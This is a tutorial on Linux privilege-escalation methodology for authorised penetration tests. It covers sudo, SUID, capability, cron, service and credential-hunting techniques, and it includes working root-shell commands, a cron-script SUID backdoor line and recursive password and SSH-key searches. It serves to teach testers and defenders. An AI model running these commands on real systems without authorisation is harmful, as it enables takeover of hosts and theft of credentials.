## The order of operations

Privilege escalation fails for one of two reasons: people run a scanner before they understand the host, or they stop at the first finding without asking what it grants.

The method below is deliberately boring. Identity, then rights, then scheduled work, then running services, then binaries and capabilities, then credentials. Each step answers a question the next step depends on.

> [!NOTE]
> Everything here assumes written authorisation on a target you own or are contracted to test. Local enumeration commands read sensitive files; that is the point, and it is also why scope matters.

## Step 1 — Know who you are

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

A shell as `www-data` in the `www-data` group is a different problem from a shell as a normal user in `sudo` and `docker` groups. Kernel version matters only if you are considering a kernel exploit — and on a modern patched host, that is usually the wrong path.

```bash
# group membership is often the whole answer
groups
```

## Step 2 — Enumerate sudo rights first

`sudo -l` is the highest-value command on the box. It costs nothing and frequently ends the engagement.

```bash
sudo -l
```

```text
User www-data may run the following commands on web01:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/systemctl restart nginx
```

Two entries, two different techniques:

- A binary that can execute arbitrary commands (`find -exec`) is a direct root shell.
- A service restart is a file-write primitive if you can influence the unit or its configuration.

GTFOBins documents the escape for each binary. The pattern to recognise is any program that can spawn a shell, read a file, or write a file:

```bash
sudo find . -exec /bin/sh -p \; -quit
```

If sudo asks for a password, check whether the user's password is known — a credential found in a web config often satisfies it.

## Step 3 — SUID and capabilities

SUID binaries execute with the file owner's privileges. A root-owned SUID binary you can influence is root.

```bash
# every SUID binary on the host
find / -perm -4000 -type f 2>/dev/null

# compare against the distribution's expected list
# (a custom binary in /opt or /usr/local is the interesting one)
```

Capabilities are the modern, narrower version of SUID and are easy to overlook:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.10 = cap_setuid+ep
```

`cap_setuid` on an interpreter means you can become any user, including root:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> [!TIP]
> `cap_dac_read_search` grants read access to everything; `cap_net_raw` grants packet capture; `cap_setuid` grants identity changes. Any of the three is usually enough.

## Step 4 — Scheduled work

Cron jobs run as their owner. A root cron job that executes a script you can write is root, no exploit required.

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# anything world-writable that a scheduler executes
find / -path /proc -prune -o -type f -perm -0002 -print 2>/dev/null | head -50
```

Watch for two subtleties:

- **PATH hijacking.** If a root cron job calls `tar` or `backup` without an absolute path, and `/tmp` or a user-writable directory is earlier in `PATH`, your binary runs instead.
- **Script directories.** A root-owned script in a user-writable directory is editable even though the file itself is read-only — replace it, do not edit it.

```bash
# a world-writable script executed by root cron
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait for the next minute, then:
/tmp/rootbash -p
```

## Step 5 — Services and sockets

Long-running services have two useful properties: they run as someone privileged, and they trust local files.

```bash
ps auxww
ss -tulpn
systemctl list-units --type=service --state=running
```

Look for:

- A service binary or config file writable by your user.
- A database listening on localhost with default credentials.
- A monitoring agent that executes commands from a writable directory.
- `/etc/systemd/system/*.service` files you can modify, then `systemctl daemon-reload`.

```bash
# writable unit file → arbitrary command as the service user
ls -la /etc/systemd/system/
```

## Step 6 — Credentials on disk

Before anything exotic, search for secrets. Real environments leak them constantly.

```bash
grep -RInE "password|passwd|secret|api[_-]?key|token" \
  /var/www /opt /home /etc 2>/dev/null | head -80

# shell history is a log of past privilege
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# ssh keys with loose permissions
find / -name "id_*" -o -name "*.pem" 2>/dev/null
```

Credential reuse between a service account and a local user is the most common path from `www-data` to root in both labs and production.

## Step 7 — Automate, but verify

LinPEAS and similar scripts compress steps 1–6 into one pass. Use them as a checklist, not an oracle: they flag *possibilities*, and every flag needs a human decision.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas.out
```

Red and yellow output is a starting point. Ask three questions about each hit:

1. Can I control the input?
2. Does it run as a more privileged user?
3. Is the path actually writable by me?

If any answer is no, move on.

## The methodology as a table

| Phase | Command | What you are looking for |
| --- | --- | --- |
| Identity | `id`, `groups` | Group-based access |
| Rights | `sudo -l` | NOPASSWD entries, shell-capable binaries |
| Binaries | `find / -perm -4000` | Non-standard SUID |
| Capabilities | `getcap -r /` | `cap_setuid`, `cap_dac_read_search` |
| Scheduling | `cat /etc/crontab` | Writable scripts, PATH abuse |
| Services | `ps auxww`, `ss -tulpn` | Writable configs, local-only services |
| Secrets | `grep -R password` | Reused credentials |
| Kernel | `uname -a` | Last resort on unpatched hosts |

## Lessons Learned

- **Understand before you exploit.** A SUID binary that only prints usage is not a finding.
- **Group membership is privilege.** `docker` and `lxd` membership is root-equivalent by design.
- **Writable directories beat writable files.** Replacement is often enough.
- **Secrets are the most common path**, not kernel exploits.
- **Document the exact command and output** for every escalation step — a report that cannot be reproduced is not evidence.

## References

- GTFOBins — Unix binaries exploitable for privilege escalation
- HackTricks — Linux privilege escalation
- CIS Benchmarks — Linux distribution hardening guidance
